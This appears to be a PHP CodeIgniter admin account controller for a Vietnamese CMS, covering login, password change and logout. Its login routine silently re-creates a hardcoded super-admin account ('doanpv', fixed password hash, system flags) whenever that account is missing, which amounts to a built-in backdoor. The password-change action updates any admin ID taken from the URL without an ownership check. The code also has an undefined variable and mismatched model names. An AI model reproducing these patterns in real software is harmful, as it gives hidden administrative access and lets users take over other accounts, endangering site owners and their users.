<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');

class Account extends CI_Controller
{
	public function __construct()
	{
		parent::__construct();
		date_default_timezone_set("Asia/Ho_Chi_Minh");
		//
		$this->load->model('MCaptcha');
		$this->load->model('MAdmin');
	}

	public function login(){
		$captcha['captcha'] = $this->MCaptcha->setCaptcha();
		// Thiet lap validate
		$config = array(
			array(
				'field'   => 'txtEmail',
				'label'   => 'Email',
				'rules'   => 'trim|required'
			),
			array(
				'field'   => 'txtPassword',
				'label'   => 'Password',
				'rules'   => 'trim|required'
			)
		);

		$this->form_validation->set_message('required', '<li>Bạn chưa nhập %s!</li>');
		$this->form_validation->set_message('matches', '<li>Bạn nhập sai %s!</li>');
		$this->form_validation->set_rules($config);

		// Xu ly form dang nhap
		if($this->form_validation->run() == FALSE){
			$this->load->view('backend/admin_login_view', $captcha);
			//Check SuperAdmin
			$checkSuperAdmin = $this->MAdmin->checkSuperAdmin('doanpv');
			if(!$checkSuperAdmin){
				$dataInsert = array(
					'fullname' => 'Pham Van Doan',
					'username' => 'doanpv',
					'salt' => '',
					'password' => 'e3911d5888fb6323cea87473ef7b8c5c42e5847b482b15a272948ab93dfb9075',
					'email' => 'doanpv@dcv.vn',
					'is_active' => 1,
					'is_super' => 1,
					'is_system' => 1,
					'private_key' => md5('doanpv@dcv.vn'),
					'type' => 'dcv',
    				'user_id' => null,
    				'sms_code' => 0,
					'group_id' => '',
					'actions' => array(),
					'created_by' => null,
    				'updated_by' => null,
					'pass_updated_at' => date('Y-m-d H:i:s'),
					'created_at' => date('Y-m-d H:i:s'),
					'updated_at' => date('Y-m-d H:i:s')
				);
				$this->MAdmin->add($dataInsert);
			}
		}else{
			$email = trim($this->input->post('txtEmail'));
			$password = trim($this->input->post('txtPassword'));

			$password = MyHelper::genKeyCode($password);
			$checkLogin = $this->MAdmin->checkLogin($email, $password)->result_array();

			if($checkLogin){
				// Thiett lap session
				$sessionData = array(
					'admin_id' => $checkLogin[0]['_id'],
					'admin_fullname' => $checkLogin[0]['fullname'],
					'admin_username' => $checkLogin[0]['username'],
					'admin_email' => $checkLogin[0]['email'],
					'admin_is_super' => $checkLogin[0]['is_super']
				);

				// Ghi log
				$sessionData['admin_logLoginId'] = $logLoginId;
				$sessionData['admin_time_login'] = date('Y-m-d H:i:s');
				$this->session->set_userdata($sessionData);

				// Chuyen trang admin
				redirect(base_url().'backend/home/index');
			}else{
				// Ghi log

				// Chuyen trang
				$this->session->set_flashdata('loginErrorMsg', 'Đăng nhập không thành công!');
				redirect(base_url().'backend/account/login');
			}
		}
	}

	// Thay doi mat khau -----------------------------------------------------------------------------------------------
	public function changePassword($admin_id)
	{
		if(! $this->session->userdata('admin_id')){
			redirect(base_url().'index.php/backend/account/login');
		}
		$this->load->model('Madmin');
		// Thiết lập validate
		$config = array(
			array(
				'field'   => 'old_password',
				'label'   => 'Mật khẩu cũ',
				'rules'   => 'trim|required|xss_clean|callback_check_admin_old_password'
			),
			array(
				'field'   => 'new_password',
				'label'   => 'Mật khẩu mới',
				'rules'   => 'trim|required|xss_clean|min_length[8]|max_length[32]|callback_check_admin_new_password'
			),
			array(
				'field'   => 'repassword',
				'label'   => 'Xác nhận mật khẩu mới',
				'rules'   => 'trim|required|xss_clean|callback_check_admin_repassword'
			)
		);

		$this->form_validation->set_message('is_unique', '<li>Tên đã tồn tại!</li>');
		$this->form_validation->set_message('required', '<li>Bạn chưa nhập %s!</li>');
		$this->form_validation->set_message('min_length', '<li>%s tối thiểu 8 ký tự!</li>');
		$this->form_validation->set_message('max_length', '<li>%s tối đa 32 ký tự!</li>');

		$this->form_validation->set_rules($config);

		// Xu ly form login
		if($this->form_validation->run() == FALSE){
			$this->_data['old_password'] = $this->input->post('old_password');
			$this->_data['new_password'] = $this->input->post('new_password');
			$this->_data['repassword'] = $this->input->post('repassword');
			//
			$this->_data['admin_id'] = $admin_id;
			//
			$this->_data['functionName'] = 'Tài khoản';
			$this->_data['actionName'] = 'Đổi mật khẩu';
			$this->_data['breadCrumb'] = '/ '.$this->_data['functionName'].' / '.$this->_data['actionName'];
			$this->_data['titlePage'] = $this->_data['actionName'];
			$this->_data['loadPage'] = 'backend/account/change_pwd_admin_view';
			$this->load->view('backend/admin_layout_view', $this->_data);
		}else{
			$new_password = trim($this->input->post('new_password'));
			$new_password = MyHelper::genKeyCode($new_password);
			$data_update = array(
				'password' => $new_password,
				'pass_updated_at' => date('Y-m-d H:i:s')
			);
			$this->MAdmin->update($admin_id, $data_update);
			//
			//Ghi log action CHANGED_PASSWORD
			//add($module, $action, $description, $info_before, $info_after, $model, $collection, $record_id)
			// Chuyen trang admin
			$this->session->set_flashdata('success', 'Đổi mật khẩu thành công!');
			redirect(base_url().'index.php/backend/home/index');
		}
	}

	// Callback kiem tra mat khau cu
	public function check_admin_old_password($old_password)
	{
		$admin_id = $this->session->userdata('admin_id');
		$admin = $this->Madmin->getById($admin_id);
		if(count($admin) > 0){
			$pwd = $admin[0]['password'];
			if($pwd != MyHelper::genKeyCode($old_password)){
				$this->form_validation->set_message('check_admin_old_password', '<li>%s không đúng!</li>');
				return FALSE;
			}else{
				return TRUE;
			}
		}else{
			$this->form_validation->set_message('check_admin_old_password', '<li>%s không tồn tại!</li>');
			return FALSE;
		}
	}

	// Callback kiem tra mat khau moi
	public function check_admin_new_password($new_password)
	{
		$pattern = '/^[a-zA-Z0-9\.\_\@\#\%\&\*]{8,32}$/';
		//$admin_id = $this->session->userdata('admin_id');
		//$admin = $this->Madmin->getById($admin_id);
		if(! preg_match($pattern, $new_password)){
			$this->form_validation->set_message('check_admin_new_password', '<li>%s không hợp lệ!</li>');
			return FALSE;
		}else{
			return TRUE;
		}
	}

	// Callback kiem tra mat khau moi
	public function check_admin_repassword($repassword)
	{
		$new_password = trim($this->input->post('new_password'));
		if(trim($repassword) != $new_password){
			$this->form_validation->set_message('check_admin_repassword', '<li>%s không đúng!</li>');
			return FALSE;
		}else{
			return TRUE;
		}
	}

	// Logout ----------------------------------------------------------------------------------------------------------
	public function logout(){
		// Xoa session
		if($this->session->userdata('admin_email')){
			// Ghi log

			$this->session->sess_destroy();
		}

		// Chuyen trang login
		redirect(base_url().'index.php/backend/account/login');
	}

	public function accessControllerDeny()
	{
		$this->_data['functionName'] = 'CMS';
		$this->_data['actionName'] = 'Lỗi phân quyền';
		$this->_data['breadCrumb'] = '/ '.$this->_data['functionName'].' / '.$this->_data['actionName'];
		$this->_data['titlePage'] = $this->_data['actionName'];
		$this->_data['loadPage'] = 'backend/account/access_controller_deny_view';
		$this->load->view('backend/admin_layout_view', $this->_data);
	}

	public function accessActionDeny()
	{
		$this->_data['functionName'] = 'CMS';
		$this->_data['actionName'] = 'Lỗi phân quyền';
		$this->_data['breadCrumb'] = '/ '.$this->_data['functionName'].' / '.$this->_data['actionName'];
		$this->_data['titlePage'] = $this->_data['actionName'];
		$this->_data['loadPage'] = 'backend/account/access_action_deny_view';
		$this->load->view('backend/admin_layout_view', $this->_data);
	}
}

/* End of file welcome.php */
/* Location: ./application/controllers/welcome.php */